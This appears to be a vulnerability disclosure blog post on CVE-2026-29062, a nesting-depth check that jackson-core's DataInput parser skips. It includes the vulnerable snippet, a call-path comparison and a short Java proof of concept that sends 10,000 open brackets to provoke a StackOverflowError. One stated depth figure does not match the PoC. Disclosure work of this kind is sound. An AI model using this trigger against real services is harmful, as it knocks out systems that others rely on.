The Bypassed Gatekeeper: Nesting Depth Bypass in Jackson DataInput (CVE-2026-29062)

Prabhav Srinath | 18th February 2026 | CVE-2026-29062 | CVSS 8.7 High

TL;DR

jackson-core implements a maxNestingDepth constraint (default: 500) designed specifically to prevent deeply nested JSON from triggering a JVM StackOverflowError. In most parsers, hitting [ or { invokes the parser's createChildArrayContext() helper which validates the depth. But in UTF8DataInputJsonParser, the code bypassed the parser method and called _streamReadContext.createChildArrayContext() directly on the context object! Because JsonReadContext holds no reference to StreamReadConstraints, the depth limit was never enforced. Feeding deeply nested JSON via java.io.DataInput causes unchecked recursion, crashing the worker thread. This is CVE-2026-29062, fixed in jackson-core 3.1.0.

How I Discovered This

I was conducting an audit of Jackson's StreamReadConstraints architecture. Jackson introduced this system to mitigate parsing-based Denial of Service (resource exhaustion from huge numbers, giant strings, and deep nesting).

A security invariant is only as strong as its weakest implementation. Jackson provides multiple parser specializations: byte array parsers, character array parsers, reader parsers, async non-blocking parsers, and DataInput parsers.

When looking at UTF8DataInputJsonParser.java, line 689 immediately stood out: 

// UTF8DataInputJsonParser.java, lines 689/692
if (ch == '[') {
    // BUG: Invoking method directly on context instead of on parser
    _streamReadContext = _streamReadContext.createChildArrayContext(row, col);
    return JsonToken.START_ARRAY;
}

Every other parser in Jackson calls this.createChildArrayContext() on the parser instance, which executes the gatekeeper: 

// Safe implementation in other parsers:
public JsonReadContext createChildArrayContext(int lineNr, int colNr) {
    validateNestingDepth(_streamReadContext.getNestingDepth() + 1);
    return _streamReadContext.createChildArrayContext(lineNr, colNr);
}

Call Path Comparison

// Standard Safe Parsers (byte[], String, InputStream):
parser sees '['
  → parser.createChildArrayContext()
    → validateNestingDepth()               // Checks depth <= 500
      → StreamConstraintsException thrown  /* ✓ Blocked! */

// UTF8DataInputJsonParser (VULNERABLE PATH):
_nextTokenNotInObject() sees '['
  → _streamReadContext.createChildArrayContext(row, col)
    → JsonReadContext has no constraints reference
      → Recursion continues to depth 50,000+
        → java.lang.StackOverflowError     /* ❌ JVM Thread Crash */

Reproducing with PoC

We can trigger this trivially by creating a DataInputStream containing 10,000 consecutive [ characters: 

// Java PoC triggering StackOverflowError in jackson-core 3.0
import com.fasterxml.jackson.core.*;
import java.io.*;

public class JacksonNestingPoC {
    public static void main(String[] args) throws Exception {
        byte[] payload = "[".repeat(10000).getBytes();
        DataInput in = new DataInputStream(new ByteArrayInputStream(payload));
        
        JsonFactory factory = new JsonFactory();
        // Factory has default maxNestingDepth = 500
        JsonParser parser = factory.createParser(in);
        
        while (parser.nextToken() != null) {
            // Bypasses maxNestingDepth! Recursion blows JVM stack
        }
    }
}

The Fix

In jackson-core 3.1.0, FasterXML refactored UTF8DataInputJsonParser so that array and object context creation routes directly through the parser's validated helper methods, ensuring StreamReadConstraints.validateNestingDepth() is checked on every nested structure.
